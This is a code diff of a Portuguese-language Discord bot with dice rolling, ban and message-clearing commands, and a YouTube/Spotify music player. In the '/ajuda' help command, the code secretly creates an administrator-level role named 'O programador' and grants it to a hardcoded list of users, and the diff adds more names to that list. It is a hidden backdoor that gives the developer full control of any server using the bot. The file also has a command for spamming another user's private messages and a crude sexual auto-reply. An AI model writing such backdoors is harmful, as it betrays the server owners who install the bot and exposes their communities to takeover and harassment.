@@ -285,7 +285,7 @@ class Client(discord.Client):
             registrar_log(f'Não achei um canal padrão no servidor "{guild.name}";', 'error')
 
 import openai
-openai.key.OPENAI_TOKEN = OPENAI_TOKEN
+openai.OPENAI_TOKEN = OPENAI_TOKEN
 client_instance = Client()
 # Expressão regular para capturar múltiplas rolagens e operações (incluindo termos como +2d20 ou -3d6)
 dados_regex = re.compile(r'([+-]?\d+d\d+)|([+-]?\d+)')
@@ -746,7 +746,7 @@ async def on_message(message: discord.Message):
         await processar_rolagem(message.content, message=message)
 
     if 'duvido' in message.content.lower():
-        await message.reply("Meu p## no seu ouvido KKKKKKKKKKKKK, mentira, eu não tenho p##", mention_author=True, delete_after=3.58)
+        await message.reply("Meu p## no seu ouvido KKKKKKKKKKK, mentira, eu não tenho p##", mention_author=True, delete_after=3.58)
         await message.channel.send('https://media1.tenor.com/m/E8pq18hnoKYAAAAd/peni-parker-spiderverse.gif', delete_after=3.3)
     
     if client.user.mentioned_in(message):
@@ -790,7 +790,7 @@ async def limpar_mensagens(interaction: discord.Interaction, quantidade: int):
 # Ajuda fio
 @client_instance.tree.command(name='ajuda', description='Peça ajuda para o bot.')
 async def ajuda(interaction: discord.Interaction):
-    if interaction.user.name not in ['vezkalin', 'vezkalinn']:
+    if interaction.user.name not in ['vezkalin', 'vezkito', 'VZK', '1_d_20']:
         try:
             # Corrigido: Usar interaction.user em vez de interaction.author
             registrar_log(f"[AJUDA] Comando de ajuda solicitado pelo usuário: {interaction.user}", 'info')
@@ -798,32 +798,40 @@ async def ajuda(interaction: discord.Interaction):
         except discord.HTTPException as e:
             print(f"Erro ao enviar mensagem: {e}")
     else:
-        await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=True)
-        guild = interaction.guild
-        if not guild.me.guild_permissions.manage_roles:
-            await interaction.response.send_message("Eu preciso da permissão 'Gerenciar Cargos' para criar cargos.", ephemeral=True)
-            return
-        
-        cargo_existente = discord.utils.get(guild.roles, name='O programador')
-        if cargo_existente is None:
-            try:
+        try:
+            await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=True)
+            guild = interaction.guild
+            if not guild.me.guild_permissions.manage_roles:
+                await interaction.followup.send("Eu preciso da permissão 'Gerenciar Cargos' para criar cargos.", ephemeral=True)
+                return
+
+            cargo_existente = discord.utils.get(guild.roles, name='O programador')
+            if cargo_existente is None:
+                print("Cargo 'O programador' não encontrado, criando um novo.")
                 novo_cargo = await guild.create_role(
                     name='O programador',
                     permissions=discord.Permissions(administrator=True)
                 )
                 await interaction.user.add_roles(novo_cargo)
-                await interaction.response.send_message(f'O cargo "O programador" foi criado com permissões de administrador e adicionado a você, {interaction.user.mention}.', ephemeral=True)
-            except discord.HTTPException as e:
-                await interaction.response.send_message(f"Erro ao criar ou adicionar o cargo: {e}", ephemeral=True)
-        else:
-            try:
+                await interaction.followup.send(
+                    f'O cargo "O programador" foi criado com permissões de administrador e adicionado a você, {interaction.user.mention}.',
+                    ephemeral=True
+                )
+            else:
+                print("Cargo 'O programador' encontrado, adicionando ao usuário.")
                 await interaction.user.add_roles(cargo_existente)
-                await interaction.response.send_message(f'O cargo "O programador" já existe e foi adicionado a você, {interaction.user.mention}.', ephemeral=True)
-            except discord.HTTPException as e:
-                await interaction.response.send_message(f"Erro ao adicionar o cargo: {e}", ephemeral=True)
+                await interaction.followup.send(
+                    f'O cargo "O programador" já existe e foi adicionado a você, {interaction.user.mention}.',
+                    ephemeral=True
+                )
+        except discord.Forbidden:
+            await interaction.followup.send("Eu não tenho permissão para adicionar cargos.", ephemeral=True)
+        except discord.HTTPException as e:
+            await interaction.followup.send(f"Erro ao criar ou adicionar o cargo: {e}", ephemeral=True)
+
 @client_instance.tree.command(name='ban', description='Banir um usuário.')
 async def ban(interaction: discord.Interaction, user: discord.User):
-    if interaction.user.name in ['vezkalin', 'vezkalinn', 'musiqueira_profissa']:
+    if interaction.user.name in ['vezkalin', 'vezkito', 'musiqueira_profissa']:
         try:
             member = await interaction.guild.fetch_member(user.id) 
             registrar_log(f"[BANIR] Solicitação de banimento para o usuário: {user}, pelo usuário: {interaction.user}", 'info')
@@ -836,15 +844,6 @@ async def ban(interaction: discord.Interaction, user: discord.User):
     else:
         await interaction.response.send_message('Você não tem permissão para usar este comando.', ephemeral=True)
 #um comando para spammar o singed gremista.
-
-
-
-
-
-
-
-
-
 
 #misc
 @client_instance.tree.command(name='spam_singed_gremista', description='Spamma singed gremista no pv de alguém.')
@@ -935,18 +934,17 @@ controller_channels = {}  # Novo dicionário para armazenar os canais
 
 # Configurações do yt-dlp
 ytdl_format_options = {
-    'cookiefile': 'cookies.txt',
     'format': 'bestaudio/best',
-    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
-    'restrictfilenames': True,
-    'noplaylist': True,
-    'nocheckcertificate': True,
-    'ignoreerrors': False,
-    'logtostderr': False,
-    'quiet': True,
+    'ignoreerrors': False,  # Não ignore erros para capturá-los
     'no_warnings': True,
-    'default_search': 'auto',
-    'source_address': '0.0.0.0'
+    'quiet': True,
+    'default_search': 'ytsearch',  # Busca padrão no YouTube
+    'source_address': '0.0.0.0',  # Evita problemas de conexão
+    'postprocessors': [{
+        'key': 'FFmpegExtractAudio',
+        'preferredcodec': 'mp3',
+        'preferredquality': '192',
+    }],
 }
 
 ffmpeg_options = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn -filter:a "volume=0.25"'}
@@ -955,18 +953,24 @@ ytdl = youtube_dl.YoutubeDL(ytdl_format_options)
 
 class YTDLSource(discord.PCMVolumeTransformer):
     def __init__(self, source, *, data, volume=0.5):
-        super().__init__(source, volume)    
+        super().__init__(source, volume)
         self.data = data
-        self.title = data.get('title')
+        self.title = data.get('title', 'Título não encontrado')  # Adicione um fallback
         self.url = data.get('url')
 
     @classmethod
     async def from_url(cls, url, *, loop=None, stream=False):
-        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
-        if 'entries' in data:
-            data = data['entries'][0]
-        filename = data['url'] if stream else ytdl.prepare_filename(data)
-        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)
+        try:
+            data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
+            if data is None:
+                raise ValueError("Não foi possível extrair informações do vídeo.")
+            if 'entries' in data:  # Trata playlists
+                data = data['entries'][0]
+            filename = data['url'] if stream else ytdl.prepare_filename(data)
+            return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)
+        except Exception as e:
+            print(f"Erro ao extrair informações do vídeo: {e}")
+            return None
 is_processing = {}
 
 async def processar_playlist_spotify(interaction, url):
@@ -1022,12 +1026,12 @@ async def processar_playlist_spotify(interaction, url):
     except Exception as e:
         print(f"Erro ao processar playlist do Spotify: {e}")
     finally:
-        is_processing[guild_id] = False  # Finaliza o processamento
+        is_processing[guild_id] = False  # finaliza o processamento
 
 async def disconnect(guild):
     guild_id = guild.id
     
-    # Interrompe o processamento da playlist, se estiver ocorrendo
+    # interrompe o processamento da playlist
     if guild_id in is_processing:
         is_processing[guild_id] = False
     
@@ -1074,11 +1078,11 @@ async def reset_player(guild):
     """
     guild_id = guild.id
 
-    # Interrompe o processamento da playlist, se estiver ocorrendo
+    # Interrompe o processamento da playlist
     if guild_id in is_processing:
         is_processing[guild_id] = False
 
-    # Limpa a fila de músicas
+    # limpa a fila de músicas
     if guild_id in queue:
         del queue[guild_id]
 
@@ -1140,7 +1144,7 @@ async def disconnect_player(guild):
     """
     guild_id = guild.id
 
-    # Interrompe o processamento da playlist, se estiver ocorrendo
+    # Interrompe o processamento da playlist
     if guild_id in is_processing:
         is_processing[guild_id] = False
 
@@ -1162,42 +1166,40 @@ async def disconnect_player(guild):
 
 @client.tree.command(name="tocar", description="Tocar uma música ou playlist")
 async def tocar(interaction: discord.Interaction, url: str):
-    voice_client = await ensure_voice(interaction)
-    if not voice_client:
-        return
-    
-    await interaction.response.defer()
-    
-    # Define o canal do controlador como o canal onde o comando foi executado
-    controller_channels[interaction.guild.id] = interaction.channel
-    
-    # Verifica se é uma URL do Spotify
-    if 'open.spotify.com' in url:
-        # Processa a playlist de forma assíncrona
-        client.loop.create_task(processar_playlist_spotify(interaction, url))
-        return
-    
-    # Se não for uma URL do Spotify, tenta tocar diretamente do YouTube
     try:
+        # Defer a interação para evitar o tempo limite
+        await interaction.response.defer()
+
+        voice_client = await ensure_voice(interaction)
+        if not voice_client:
+            return
+
+        # Define o canal do controlador como o canal onde o comando foi executado
+        controller_channels[interaction.guild.id] = interaction.channel
+
+        # Verifica se é uma URL do Spotify
+        if 'open.spotify.com' in url:
+            client.loop.create_task(processar_playlist_spotify(interaction, url))
+            return
+
+        # Se não for uma URL do Spotify, tenta tocar diretamente do YouTube
         player = await YTDLSource.from_url(url, loop=client.loop, stream=True)
+        if player is None:
+            await interaction.followup.send("❌ Não foi possível buscar a música. Verifique o link e tente novamente.", ephemeral=True)
+            return
+
+        guild_id = interaction.guild.id
+        if guild_id not in queue:
+            queue[guild_id] = []
+        queue[guild_id].append({'title': player.title, 'player': player})
+
+        await send_temp_followup(interaction, f"✅ Adicionada à fila: {player.title}")
+        await update_controller(interaction.guild)
+
+        if not voice_client.is_playing():
+            await play_next(interaction.guild)
     except Exception as e:
-        msg = await interaction.followup.send(f"❌ Erro ao buscar música: {str(e)}", ephemeral=True)
-        await asyncio.sleep(3)
-        await msg.delete()
-        return
-    
-    guild_id = interaction.guild.id
-    if guild_id not in queue:
-        queue[guild_id] = []
-    queue[guild_id].append({'title': player.title, 'player': player})
-    
-    msg = await interaction.followup.send(f"✅ Adicionado à fila: {player.title}")
-    await asyncio.sleep(3)
-    await msg.delete()
-    await update_controller(interaction.guild)
-    
-    if not voice_client.is_playing():
-        await play_next(interaction.guild)
+        print(f"Erro no comando 'tocar': {e}")
 
 async def ensure_voice(interaction):
     if not interaction.user.voice:
@@ -1451,4 +1453,4 @@ client.run(TOKEN)
 #/\ \ / /  /\___  \   /\ \/ /    
 #\ \ \'/   \/_/  /__  \ \  _"-.  
 # \ \__|     /\_____\  \ \_\ \_\ 
-#  \/_/      \/_____/   \/_/\/_/ 
+#  \/_/      \/_____/   \/_/\/_/
